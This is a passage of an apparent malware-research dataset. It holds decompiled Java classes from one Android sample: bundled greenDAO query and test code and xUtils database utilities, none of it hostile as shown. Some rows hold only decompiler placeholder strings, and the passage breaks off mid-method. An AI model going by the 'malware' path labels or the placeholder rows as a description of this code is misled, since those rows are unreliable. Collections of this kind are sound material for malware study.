"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\QueryData.code","public final class QueryData<T2> extends AbstractQueryData<T2,CountQuery<T2>> {   private QueryData(  AbstractDao<T2,?> abstractDao,  String str,  String[] strArr){     super(abstractDao,str,strArr);   }   @Override public CountQuery<T2> createQuery(){     return new CountQuery<>(this,this.dao,this.sql,(String[])this.initialValues.clone());   } } public final class QueryData<T2> extends AbstractQueryData<T2,DeleteQuery<T2>> {   private QueryData(  AbstractDao<T2,?> abstractDao,  String str,  String[] strArr){     super(abstractDao,str,strArr);   }   @Override public DeleteQuery<T2> createQuery(){     return new DeleteQuery<>(this,this.dao,this.sql,(String[])this.initialValues.clone());   } } public final class QueryData<T2> extends AbstractQueryData<T2,Query<T2>> {   private final int limitPosition;   private final int offsetPosition;   QueryData(  AbstractDao<T2,?> abstractDao,  String str,  String[] strArr,  int i,  int i2){     super(abstractDao,str,strArr);     this.limitPosition=i;     this.offsetPosition=i2;   }   @Override public Query<T2> createQuery(){     return new Query<>(this,this.dao,this.sql,(String[])this.initialValues.clone(),this.limitPosition,this.offsetPosition);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\StringCondition.code","public class StringCondition extends AbstractCondition {   protected final String string;   public StringCondition(  String str){     this.string=str;   }   public StringCondition(  String str,  Object obj){     super(obj);     this.string=str;   }   public StringCondition(  String str,  Object... objArr){     super(objArr);     this.string=str;   }   @Override public void appendTo(  StringBuilder sb,  String str){     sb.append(this.string);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.query\WhereCondition.code","public interface WhereCondition { public abstract class AbstractCondition implements WhereCondition {     protected final boolean hasSingleValue;     protected final Object value;     protected final Object[] values;     public AbstractCondition(){       this.hasSingleValue=false;       this.value=null;       this.values=null;     }     public AbstractCondition(    Object obj){       this.value=obj;       this.hasSingleValue=true;       this.values=null;     }     public AbstractCondition(    Object[] objArr){       this.value=null;       this.hasSingleValue=false;       this.values=objArr;     }     @Override public void appendValuesTo(    List<Object> list){       if (this.hasSingleValue) {         list.add(this.value);       }       if (this.values != null) {         for (        Object obj : this.values) {           list.add(obj);         }       }     }   } public class PropertyCondition extends AbstractCondition {     public final String op;     public final Property property;     public PropertyCondition(    Property property,    String str){       this.property=property;       this.op=str;     }     public PropertyCondition(    Property property,    String str,    Object obj){       super(checkValueForType(property,obj));       this.property=property;       this.op=str;     }     public PropertyCondition(    Property property,    String str,    Object[] objArr){       super(checkValuesForType(property,objArr));       this.property=property;       this.op=str;     }     private static Object checkValueForType(    Property property,    Object obj){       if (obj != null && obj.getClass().isArray()) {         throw new DaoException(""Illegal value: found array, but simple object required"");       }       if (property.type == Date.class) {         if (obj instanceof Date) {           return Long.valueOf(((Date)obj).getTime());         }         if (obj instanceof Long) {           return obj;         }         throw new DaoException(""Illegal date value: expected java.util.Date or Long for value "" + obj);       }       if (property.type != Boolean.TYPE && property.type != Boolean.class) {         return obj;       }       if (obj instanceof Boolean) {         return Integer.valueOf(((Boolean)obj).booleanValue() ? 1 : 0);       }       if (obj instanceof Number) {         int intValue=((Number)obj).intValue();         if (intValue == 0 || intValue == 1) {           return obj;         }         throw new DaoException(""Illegal boolean value: numbers must be 0 or 1, but was "" + obj);       }       if (!(obj instanceof String)) {         return obj;       }       String str=(String)obj;       if (""TRUE"".equalsIgnoreCase(str)) {         return 1;       }       if (""FALSE"".equalsIgnoreCase(str)) {         return 0;       }       throw new DaoException(""Illegal boolean value: Strings must be \""TRUE\"" or \""FALSE\"" (case insesnsitive), but was "" + obj);     }     private static Object[] checkValuesForType(    Property property,    Object[] objArr){       for (int i=0; i < objArr.length; i++) {         objArr[i]=checkValueForType(property,objArr[i]);       }       return objArr;     }     @Override public void appendTo(    StringBuilder sb,    String str){       if (str != null) {         sb.append(str).append('.');       }       sb.append('\'').append(this.property.columnName).append('\'').append(this.op);     }   } public class StringCondition extends AbstractCondition {     protected final String string;     public StringCondition(    String str){       this.string=str;     }     public StringCondition(    String str,    Object obj){       super(obj);       this.string=str;     }     public StringCondition(    String str,    Object... objArr){       super(objArr);       this.string=str;     }     @Override public void appendTo(    StringBuilder sb,    String str){       sb.append(this.string);     }   }   void appendTo(  StringBuilder sb,  String str);   void appendValuesTo(  List<Object> list); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.test\AbstractDaoSessionTest.code","public abstract class AbstractDaoSessionTest<T extends AbstractDaoMaster,S extends AbstractDaoSession> extends DbTest {   protected T daoMaster;   private final Class<T> daoMasterClass;   protected S daoSession;   public AbstractDaoSessionTest(  Class<T> cls){     this(cls,true);   }   public AbstractDaoSessionTest(  Class<T> cls,  boolean z){     super(z);     this.daoMasterClass=cls;   }   @Override public void setUp(){     super.setUp();     try {       this.daoMaster=this.daoMasterClass.getConstructor(SQLiteDatabase.class).newInstance(this.db);       this.daoMasterClass.getMethod(""createAllTables"",SQLiteDatabase.class,Boolean.TYPE).invoke(null,this.db,false);       this.daoSession=(S)this.daoMaster.newSession();     }  catch (    Exception e) {       throw new RuntimeException(""Could not prepare DAO session test"",e);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.test\AbstractDaoTest.code","public abstract class AbstractDaoTest<D extends AbstractDao<T,K>,T,K> extends DbTest {   protected D dao;   protected InternalUnitTestDaoAccess<T,K> daoAccess;   protected final Class<D> daoClass;   protected IdentityScope<K,T> identityScopeForDao;   protected Property pkColumn;   public AbstractDaoTest(  Class<D> cls){     this(cls,true);   }   public AbstractDaoTest(  Class<D> cls,  boolean z){     super(z);     this.daoClass=cls;   }   protected void clearIdentityScopeIfAny(){     if (this.identityScopeForDao == null) {       DaoLog.d(""No identity scope to clear"");     }  else {       this.identityScopeForDao.clear();       DaoLog.d(""Identity scope cleared"");     }   }   protected void logTableDump(){     logTableDump(this.dao.getTablename());   }   public void setIdentityScopeBeforeSetUp(  IdentityScope<K,T> identityScope){     this.identityScopeForDao=identityScope;   }   @Override public void setUp(){     super.setUp();     try {       setUpTableForDao();       this.daoAccess=new InternalUnitTestDaoAccess<>(this.db,this.daoClass,this.identityScopeForDao);       this.dao=this.daoAccess.getDao();     }  catch (    Exception e) {       throw new RuntimeException(""Could not prepare DAO Test"",e);     }   }   protected void setUpTableForDao(){     try {       this.daoClass.getMethod(""createTable"",SQLiteDatabase.class,Boolean.TYPE).invoke(null,this.db,false);     }  catch (    NoSuchMethodException e) {       DaoLog.i(""No createTable method"");     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.test\AbstractDaoTestLongPk.code","public abstract class AbstractDaoTestLongPk<D extends AbstractDao<T,Long>,T> extends AbstractDaoTestSinglePk<D,T,Long> {   public AbstractDaoTestLongPk(  Class<D> cls){     super(cls);   }   @Override public Long createRandomPk(){     return Long.valueOf(this.random.nextLong());   }   public void testAssignPk(){     if (!this.daoAccess.isEntityUpdateable()) {       DaoLog.d(""Skipping testAssignPk for not updateable "" + this.daoClass);       return;     }     T createEntity=createEntity(null);     if (createEntity == null) {       DaoLog.d(""Skipping testAssignPk for "" + this.daoClass + "" (createEntity returned null for null key)"");       return;     }     T createEntity2=createEntity(null);     this.dao.insert(createEntity);     this.dao.insert(createEntity2);     Long l=(Long)this.daoAccess.getKey(createEntity);     assertNotNull(l);     Long l2=(Long)this.daoAccess.getKey(createEntity2);     assertNotNull(l2);     assertFalse(l.equals(l2));     assertNotNull(this.dao.load(l));     assertNotNull(this.dao.load(l2));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.test\AbstractDaoTestSinglePk.code","public abstract class AbstractDaoTestSinglePk<D extends AbstractDao<T,K>,T,K> extends AbstractDaoTest<D,T,K> {   private Property pkColumn;   protected Set<K> usedPks;   public AbstractDaoTestSinglePk(  Class<D> cls){     super(cls);     this.usedPks=new HashSet();   }   public abstract T createEntity(  K k);   protected T createEntityWithRandomPk(){     return createEntity(nextPk());   }   protected abstract K createRandomPk();   protected K nextPk(){     for (int i=0; i < 100000; i++) {       K createRandomPk=createRandomPk();       if (this.usedPks.add(createRandomPk)) {         return createRandomPk;       }     }     throw new IllegalStateException(""Could not find a new PK"");   }   protected Cursor queryWithDummyColumnsInFront(  int i,  String str,  K k){     StringBuilder sb=new StringBuilder(""SELECT "");     for (int i2=0; i2 < i; i2++) {       sb.append(str).append("","");     }     SqlUtils.appendColumns(sb,""T"",this.dao.getAllColumns()).append("" FROM "");     sb.append(this.dao.getTablename()).append("" T"");     if (k != null) {       sb.append("" WHERE "");       assertEquals(1,this.dao.getPkColumns().length);       sb.append(this.dao.getPkColumns()[0]).append(""="");       DatabaseUtils.appendValueToSql(sb,k);     }     Cursor rawQuery=this.db.rawQuery(sb.toString(),null);     assertTrue(rawQuery.moveToFirst());     for (int i3=0; i3 < i; i3++) {       try {         assertEquals(str,rawQuery.getString(i3));       }  catch (      RuntimeException e) {         rawQuery.close();         throw e;       }     }     if (k != null) {       assertEquals(1,rawQuery.getCount());     }     return rawQuery;   }   protected void runLoadPkTest(  int i){     K nextPk=nextPk();     this.dao.insert(createEntity(nextPk));     Cursor queryWithDummyColumnsInFront=queryWithDummyColumnsInFront(i,""42"",nextPk);     try {       assertEquals(nextPk,this.daoAccess.readKey(queryWithDummyColumnsInFront,i));     }   finally {       queryWithDummyColumnsInFront.close();     }   }   @Override public void setUp(){     super.setUp();     for (    Property property : this.daoAccess.getProperties()) {       if (property.primaryKey) {         if (this.pkColumn != null) {           throw new RuntimeException(""Test does not work with multiple PK columns"");         }         this.pkColumn=property;       }     }     if (this.pkColumn == null) {       throw new RuntimeException(""Test does not work without a PK column"");     }   }   public void testCount(){     this.dao.deleteAll();     assertEquals(0L,this.dao.count());     this.dao.insert(createEntityWithRandomPk());     assertEquals(1L,this.dao.count());     this.dao.insert(createEntityWithRandomPk());     assertEquals(2L,this.dao.count());   }   public void testDelete(){     K nextPk=nextPk();     this.dao.deleteByKey(nextPk);     this.dao.insert(createEntity(nextPk));     assertNotNull(this.dao.load(nextPk));     this.dao.deleteByKey(nextPk);     assertNull(this.dao.load(nextPk));   }   public void testDeleteAll(){     ArrayList arrayList=new ArrayList();     for (int i=0; i < 10; i++) {       arrayList.add(createEntityWithRandomPk());     }     this.dao.insertInTx(arrayList);     this.dao.deleteAll();     assertEquals(0L,this.dao.count());     Iterator it=arrayList.iterator();     while (it.hasNext()) {       Object key=this.daoAccess.getKey(it.next());       assertNotNull(key);       assertNull(this.dao.load(key));     }   }   public void testDeleteByKeyInTx(){     ArrayList arrayList=new ArrayList();     for (int i=0; i < 10; i++) {       arrayList.add(createEntityWithRandomPk());     }     this.dao.insertInTx(arrayList);     ArrayList arrayList2=new ArrayList();     arrayList2.add(this.daoAccess.getKey(arrayList.get(0)));     arrayList2.add(this.daoAccess.getKey(arrayList.get(3)));     arrayList2.add(this.daoAccess.getKey(arrayList.get(4)));     arrayList2.add(this.daoAccess.getKey(arrayList.get(8)));     this.dao.deleteByKeyInTx(arrayList2);     assertEquals(arrayList.size() - arrayList2.size(),this.dao.count());     for (    Object obj : arrayList2) {       assertNotNull(obj);       assertNull(this.dao.load(obj));     }   }   public void testDeleteInTx(){     ArrayList arrayList=new ArrayList();     for (int i=0; i < 10; i++) {       arrayList.add(createEntityWithRandomPk());     }     this.dao.insertInTx(arrayList);     ArrayList arrayList2=new ArrayList();     arrayList2.add(arrayList.get(0));     arrayList2.add(arrayList.get(3));     arrayList2.add(arrayList.get(4));     arrayList2.add(arrayList.get(8));     this.dao.deleteInTx(arrayList2);     assertEquals(arrayList.size() - arrayList2.size(),this.dao.count());     Iterator it=arrayList2.iterator();     while (it.hasNext()) {       Object key=this.daoAccess.getKey(it.next());       assertNotNull(key);       assertNull(this.dao.load(key));     }   }   public void testInsertAndLoad(){     K nextPk=nextPk();     T createEntity=createEntity(nextPk);     this.dao.insert(createEntity);     assertEquals(nextPk,this.daoAccess.getKey(createEntity));     Object load=this.dao.load(nextPk);     assertNotNull(load);     assertEquals(this.daoAccess.getKey(createEntity),this.daoAccess.getKey(load));   }   public void testInsertInTx(){     this.dao.deleteAll();     ArrayList arrayList=new ArrayList();     for (int i=0; i < 20; i++) {       arrayList.add(createEntityWithRandomPk());     }     this.dao.insertInTx(arrayList);     assertEquals(arrayList.size(),this.dao.count());   }   public void testInsertOrReplaceInTx(){     this.dao.deleteAll();     ArrayList arrayList=new ArrayList();     ArrayList arrayList2=new ArrayList();     for (int i=0; i < 20; i++) {       T createEntityWithRandomPk=createEntityWithRandomPk();       if (i % 2 == 0) {         arrayList.add(createEntityWithRandomPk);       }       arrayList2.add(createEntityWithRandomPk);     }     this.dao.insertOrReplaceInTx(arrayList);     this.dao.insertOrReplaceInTx(arrayList2);     assertEquals(arrayList2.size(),this.dao.count());   }   public void testInsertOrReplaceTwice(){     T createEntityWithRandomPk=createEntityWithRandomPk();     long insert=this.dao.insert(createEntityWithRandomPk);     long insertOrReplace=this.dao.insertOrReplace(createEntityWithRandomPk);     if (this.dao.getPkProperty().type == Long.class) {       assertEquals(insert,insertOrReplace);     }   }   public void testInsertTwice(){     T createEntity=createEntity(nextPk());     this.dao.insert(createEntity);     try {       this.dao.insert(createEntity);       fail(""Inserting twice should not work"");     }  catch (    SQLException e) {     }   }   public void testLoadAll(){     this.dao.deleteAll();     ArrayList arrayList=new ArrayList();     for (int i=0; i < 15; i++) {       arrayList.add(createEntity(nextPk()));     }     this.dao.insertInTx(arrayList);     assertEquals(arrayList.size(),this.dao.loadAll().size());   }   public void testLoadPk(){     runLoadPkTest(0);   }   public void testLoadPkWithOffset(){     runLoadPkTest(10);   }   public void testQuery(){     this.dao.insert(createEntityWithRandomPk());     K nextPk=nextPk();     this.dao.insert(createEntity(nextPk));     this.dao.insert(createEntityWithRandomPk());     List<T> queryRaw=this.dao.queryRaw(""WHERE "" + this.dao.getPkColumns()[0] + ""=?"",nextPk.toString());     assertEquals(1,queryRaw.size());     assertEquals(nextPk,this.daoAccess.getKey(queryRaw.get(0)));   }   public void testReadWithOffset(){     K nextPk=nextPk();     this.dao.insert(createEntity(nextPk));     Cursor queryWithDummyColumnsInFront=queryWithDummyColumnsInFront(5,""42"",nextPk);     try {       assertEquals(nextPk,this.daoAccess.getKey(this.daoAccess.readEntity(queryWithDummyColumnsInFront,5)));     }   finally {       queryWithDummyColumnsInFront.close();     }   }   public void testRowId(){     assertTrue(this.dao.insert(createEntityWithRandomPk()) != this.dao.insert(createEntityWithRandomPk()));   }   public void testUpdate(){     this.dao.deleteAll();     T createEntityWithRandomPk=createEntityWithRandomPk();     this.dao.insert(createEntityWithRandomPk);     this.dao.update(createEntityWithRandomPk);     assertEquals(1L,this.dao.count());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.test\AbstractDaoTestStringPk.code","public abstract class AbstractDaoTestStringPk<D extends AbstractDao<T,String>,T> extends AbstractDaoTestSinglePk<D,T,String> {   public AbstractDaoTestStringPk(  Class<D> cls){     super(cls);   }   @Override public String createRandomPk(){     int nextInt=this.random.nextInt(30) + 1;     StringBuilder sb=new StringBuilder();     for (int i=0; i < nextInt; i++) {       sb.append((char)(this.random.nextInt(25) + 97));     }     return sb.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.de.greenrobot.dao.test\DbTest.code","public abstract class DbTest extends AndroidTestCase {   public static final String DB_NAME=""greendao-unittest-db.temp"";   private Application application;   protected SQLiteDatabase db;   protected final boolean inMemory;   protected final Random random;   public DbTest(){     this(true);   }   public DbTest(  boolean z){     this.inMemory=z;     this.random=new Random();   }   public <T extends Application>T createApplication(  Class<T> cls){     assertNull(""Application already created"",this.application);     try {       T t=(T)Instrumentation.newApplication(cls,getContext());       t.onCreate();       this.application=t;       return t;     }  catch (    Exception e) {       throw new RuntimeException(""Could not create application "" + cls,e);     }   }   protected SQLiteDatabase createDatabase(){     if (this.inMemory) {       return SQLiteDatabase.create(null);     }     getContext().deleteDatabase(DB_NAME);     return getContext().openOrCreateDatabase(DB_NAME,0,null);   }   public <T extends Application>T getApplication(){     assertNotNull(""Application not yet created"",this.application);     return (T)this.application;   }   public void logTableDump(  String str){     DbUtils.logTableDump(this.db,str);   }   public void setUp(){     super.setUp();     this.db=createDatabase();   }   protected void tearDown(){     if (this.application != null) {       terminateApplication();     }     this.db.close();     if (!this.inMemory) {       getContext().deleteDatabase(DB_NAME);     }     super.tearDown();   }   public void terminateApplication(){     assertNotNull(""Application not yet created"",this.application);     this.application.onTerminate();     this.application=null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils\BitmapLoadTask.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7c1eb277"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils\BitmapUtils.code","!org.eclipse.jdt.core.dom.TypeDeclaration@f86bef7"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils\DaoConfig.code","public class DaoConfig {   private Context context;   private String dbDir;   private DbUpgradeListener dbUpgradeListener;   private String dbName=""xUtils.db"";   private int dbVersion=1;   public DaoConfig(  Context context){     this.context=context.getApplicationContext();   }   public Context getContext(){     return this.context;   }   public String getDbDir(){     return this.dbDir;   }   public String getDbName(){     return this.dbName;   }   public DbUpgradeListener getDbUpgradeListener(){     return this.dbUpgradeListener;   }   public int getDbVersion(){     return this.dbVersion;   }   public void setDbDir(  String str){     this.dbDir=str;   }   public void setDbName(  String str){     if (TextUtils.isEmpty(str)) {       return;     }     this.dbName=str;   }   public void setDbUpgradeListener(  DbUpgradeListener dbUpgradeListener){     this.dbUpgradeListener=dbUpgradeListener;   }   public void setDbVersion(  int i){     this.dbVersion=i;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils\DbUpgradeListener.code","public interface DbUpgradeListener {   void onUpgrade(  DbUtils dbUtils,  int i,  int i2); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils\DbUtils.code","public class DbUtils {   private static HashMap<String,DbUtils> daoMap=new HashMap<>();   private DaoConfig daoConfig;   private SQLiteDatabase database;   private boolean debug=false;   private boolean allowTransaction=false;   private Lock writeLock=new ReentrantLock();   private volatile boolean writeLocked=false;   private final FindTempCache findTempCache=new FindTempCache(); public class DaoConfig {     private Context context;     private String dbDir;     private DbUpgradeListener dbUpgradeListener;     private String dbName=""xUtils.db"";     private int dbVersion=1;     public DaoConfig(    Context context){       this.context=context.getApplicationContext();     }     public Context getContext(){       return this.context;     }     public String getDbDir(){       return this.dbDir;     }     public String getDbName(){       return this.dbName;     }     public DbUpgradeListener getDbUpgradeListener(){       return this.dbUpgradeListener;     }     public int getDbVersion(){       return this.dbVersion;     }     public void setDbDir(    String str){       this.dbDir=str;     }     public void setDbName(    String str){       if (TextUtils.isEmpty(str)) {         return;       }       this.dbName=str;     }     public void setDbUpgradeListener(    DbUpgradeListener dbUpgradeListener){       this.dbUpgradeListener=dbUpgradeListener;     }     public void setDbVersion(    int i){       this.dbVersion=i;     }   } public interface DbUpgradeListener {     void onUpgrade(    DbUtils dbUtils,    int i,    int i2);   } public class FindTempCache {     private final ConcurrentHashMap<String,Object> cache;     private long seq;     private FindTempCache(){       this.cache=new ConcurrentHashMap<>();       this.seq=0L;     }     public Object get(    String str){       return this.cache.get(str);     }     public void put(    String str,    Object obj){       if (str == null || obj == null) {         return;       }       this.cache.put(str,obj);     }     public void setSeq(    long j){       if (this.seq != j) {         this.cache.clear();         this.seq=j;       }     }   }   private DbUtils(  DaoConfig daoConfig){     if (daoConfig == null) {       throw new IllegalArgumentException(""daoConfig may not be null"");     }     this.database=createDatabase(daoConfig);     this.daoConfig=daoConfig;   }   private void beginTransaction(){     if (this.allowTransaction) {       this.database.beginTransaction();     }  else {       this.writeLock.lock();       this.writeLocked=true;     }   }   public static DbUtils create(  Context context){     return getInstance(new DaoConfig(context));   }   public static DbUtils create(  Context context,  String str){     DaoConfig daoConfig=new DaoConfig(context);     daoConfig.setDbName(str);     return getInstance(daoConfig);   }   public static DbUtils create(  Context context,  String str,  int i,  DbUpgradeListener dbUpgradeListener){     DaoConfig daoConfig=new DaoConfig(context);     daoConfig.setDbName(str);     daoConfig.setDbVersion(i);     daoConfig.setDbUpgradeListener(dbUpgradeListener);     return getInstance(daoConfig);   }   public static DbUtils create(  Context context,  String str,  String str2){     DaoConfig daoConfig=new DaoConfig(context);     daoConfig.setDbDir(str);     daoConfig.setDbName(str2);     return getInstance(daoConfig);   }   public static DbUtils create(  Context context,  String str,  String str2,  int i,  DbUpgradeListener dbUpgradeListener){     DaoConfig daoConfig=new DaoConfig(context);     daoConfig.setDbDir(str);     daoConfig.setDbName(str2);     daoConfig.setDbVersion(i);     daoConfig.setDbUpgradeListener(dbUpgradeListener);     return getInstance(daoConfig);   }   public static DbUtils create(  DaoConfig daoConfig){     return getInstance(daoConfig);   }   private SQLiteDatabase createDatabase(  DaoConfig daoConfig){     String dbDir=daoConfig.getDbDir();     if (TextUtils.isEmpty(dbDir)) {       return daoConfig.getContext().openOrCreateDatabase(daoConfig.getDbName(),0,null);     }     File file=new File(dbDir);     if (file.exists() || file.mkdirs()) {       return SQLiteDatabase.openOrCreateDatabase(new File(dbDir,daoConfig.getDbName()),(SQLiteDatabase.CursorFactory)null);     }     return null;   }   private void debugSql(  String str){     if (this.debug) {       LogUtils.d(str);     }   }   private void endTransaction(){     if (this.allowTransaction) {       this.database.endTransaction();     }     if (this.writeLocked) {       this.writeLock.unlock();       this.writeLocked=false;     }   }   private static synchronized DbUtils getInstance(  DaoConfig daoConfig){     DbUtils dbUtils; synchronized (DbUtils.class) {       dbUtils=daoMap.get(daoConfig.getDbName());       if (dbUtils == null) {         dbUtils=new DbUtils(daoConfig);         daoMap.put(daoConfig.getDbName(),dbUtils);       }  else {         dbUtils.daoConfig=daoConfig;       }       SQLiteDatabase sQLiteDatabase=dbUtils.database;       int version=sQLiteDatabase.getVersion();       int dbVersion=daoConfig.getDbVersion();       if (version != dbVersion) {         if (version != 0) {           DbUpgradeListener dbUpgradeListener=daoConfig.getDbUpgradeListener();           if (dbUpgradeListener != null) {             dbUpgradeListener.onUpgrade(dbUtils,version,dbVersion);           }  else {             try {               dbUtils.dropDb();             }  catch (            DbException e) {               LogUtils.e(e.getMessage(),e);             }           }         }         sQLiteDatabase.setVersion(dbVersion);       }     }     return dbUtils;   }   private long getLastAutoIncrementId(  String str){     Cursor execQuery=execQuery(""SELECT seq FROM sqlite_sequence WHERE name='"" + str + ""'"");     try {       if (execQuery != null) {         try {           r0=execQuery.moveToNext() ? execQuery.getLong(0) : -1L;         }  catch (        Throwable th) {           throw new DbException(th);         }       }       return r0;     }   finally {       IOUtils.closeQuietly(execQuery);     }   }   private boolean saveBindingIdWithoutTransaction(  Object obj){     Table table=Table.get(this,obj.getClass());     Id id=table.id;     if (!id.isAutoIncrement()) {       execNonQuery(SqlInfoBuilder.buildInsertSqlInfo(this,obj));       return true;     }     execNonQuery(SqlInfoBuilder.buildInsertSqlInfo(this,obj));     long lastAutoIncrementId=getLastAutoIncrementId(table.tableName);     if (lastAutoIncrementId == -1) {       return false;     }     id.setAutoIncrementId(obj,lastAutoIncrementId);     return true;   }   private void saveOrUpdateWithoutTransaction(  Object obj){     Id id=Table.get(this,obj.getClass()).id;     if (!id.isAutoIncrement()) {       execNonQuery(SqlInfoBuilder.buildReplaceSqlInfo(this,obj));     }  else     if (id.getColumnValue(obj) != null) {       execNonQuery(SqlInfoBuilder.buildUpdateSqlInfo(this,obj,new String[0]));     }  else {       saveBindingIdWithoutTransaction(obj);     }   }   private void setTransactionSuccessful(){     if (this.allowTransaction) {       this.database.setTransactionSuccessful();     }   }   public void close(){     String dbName=this.daoConfig.getDbName();     if (daoMap.containsKey(dbName)) {       daoMap.remove(dbName);       this.database.close();     }   }   public DbUtils configAllowTransaction(  boolean z){     this.allowTransaction=z;     return this;   }   public DbUtils configDebug(  boolean z){     this.debug=z;     return this;   }   public long count(  Selector selector){     Class<?> entityType=selector.getEntityType();     if (tableIsExist(entityType)) {       return findDbModelFirst(selector.select(""count("" + Table.get(this,entityType).id.getColumnName() + "") as count"")).getLong(""count"");     }     return 0L;   }   public long count(  Class<?> cls){     return count(Selector.from(cls));   }   public void createTableIfNotExist(  Class<?> cls){     if (tableIsExist(cls)) {       return;     }     execNonQuery(SqlInfoBuilder.buildCreateTableSqlInfo(this,cls));     String execAfterTableCreated=TableUtils.getExecAfterTableCreated(cls);     if (TextUtils.isEmpty(execAfterTableCreated)) {       return;     }     execNonQuery(execAfterTableCreated);   }   public void delete(  Class<?> cls,  WhereBuilder whereBuilder){     if (tableIsExist(cls)) {       try {         beginTransaction();         execNonQuery(SqlInfoBuilder.buildDeleteSqlInfo(this,cls,whereBuilder));         setTransactionSuccessful();       }   finally {         endTransaction();       }     }   }   public void delete(  Object obj){     if (tableIsExist(obj.getClass())) {       try {         beginTransaction();         execNonQuery(SqlInfoBuilder.buildDeleteSqlInfo(this,obj));         setTransactionSuccessful();       }   finally {         endTransaction();       }     }   }   public void deleteAll(  Class<?> cls){     delete(cls,null);   }   public void deleteAll(  List<?> list){     if (list == null || list.size() == 0 || !tableIsExist(list.get(0).getClass())) {       return;     }     try {       beginTransaction();       Iterator<?> it=list.iterator();       while (it.hasNext()) {         execNonQuery(SqlInfoBuilder.buildDeleteSqlInfo(this,it.next()));       }       setTransactionSuccessful();     }   finally {       endTransaction();     }   }   public void deleteById(  Class<?> cls,  Object obj){     if (tableIsExist(cls)) {       try {         beginTransaction();         execNonQuery(SqlInfoBuilder.buildDeleteSqlInfo(this,cls,obj));         setTransactionSuccessful();       }   finally {         endTransaction();       }     }   }   public void dropDb(){     Cursor execQuery=execQuery(""SELECT name FROM sqlite_master WHERE type='table' AND name<>'sqlite_sequence'"");     if (execQuery != null) {       while (execQuery.moveToNext()) {         try {           try {             try {               String string=execQuery.getString(0);               execNonQuery(""DROP TABLE "" + string);               Table.remove(this,string);             }  catch (            Throwable th) {               LogUtils.e(th.getMessage(),th);             }           }  catch (          Throwable th2) {             throw new DbException(th2);           }         }   finally {           IOUtils.closeQuietly(execQuery);         }       }     }   }   public void dropTable(  Class<?> cls){     if (tableIsExist(cls)) {       execNonQuery(""DROP TABLE "" + TableUtils.getTableName(cls));       Table.remove(this,cls);     }   }   public void execNonQuery(  SqlInfo sqlInfo){     debugSql(sqlInfo.getSql());     try {       if (sqlInfo.getBindArgs() != null) {         this.database.execSQL(sqlInfo.getSql(),sqlInfo.getBindArgsAsArray());       }  else {         this.database.execSQL(sqlInfo.getSql());       }     }  catch (    Throwable th) {       throw new DbException(th);     }   }   public void execNonQuery(  String str){     debugSql(str);     try {       this.database.execSQL(str);     }  catch (    Throwable th) {       throw new DbException(th);     }   }   public Cursor execQuery(  SqlInfo sqlInfo){     debugSql(sqlInfo.getSql());     try {       return this.database.rawQuery(sqlInfo.getSql(),sqlInfo.getBindArgsAsStrArray());     }  catch (    Throwable th) {       throw new DbException(th);     }   }   public Cursor execQuery(  String str){     debugSql(str);     try {       return this.database.rawQuery(str,null);     }  catch (    Throwable th) {       throw new DbException(th);     }   }   public <T>List<T> findAll(  Selector selector){     if (!tableIsExist(selector.getEntityType())) {       return null;     }     String selector2=selector.toString();     long seq=CursorUtils.FindCacheSequence.getSeq();     this.findTempCache.setSeq(seq);     Object obj=this.findTempCache.get(selector2);     if (obj != null) {       return (List)obj;     }     ArrayList arrayList=new ArrayList();     Cursor execQuery=execQuery(selector2);     if (execQuery == null) {       return arrayList;     }     while (execQuery.moveToNext()) {       try {         try {           arrayList.add(CursorUtils.getEntity(this,execQuery,selector.getEntityType(),seq));         }  catch (        Throwable th) {           throw new DbException(th);         }       }   finally {         IOUtils.closeQuietly(execQuery);       }     }     this.findTempCache.put(selector2,arrayList);     return arrayList;   }   public <T>List<T> findAll(  Class<T> cls){     return findAll(Selector.from(cls));   }   public <T>T findById(  Class<T> cls,  Object obj){     if (!tableIsExist(cls)) {       return null;     }     String selector=Selector.from(cls).where(Table.get(this,cls).id.getColumnName(),""="",obj).limit(1).toString();     long seq=CursorUtils.FindCacheSequence.getSeq();     this.findTempCache.setSeq(seq);     T t=(T)this.findTempCache.get(selector);     if (t != null) {       return t;     }     Cursor execQuery=execQuery(selector);     if (execQuery == null) {       return null;     }     try {       try {         if (!execQuery.moveToNext()) {           return null;         }         T t2=(T)CursorUtils.getEntity(this,execQuery,cls,seq);         this.findTempCache.put(selector,t2);         return t2;       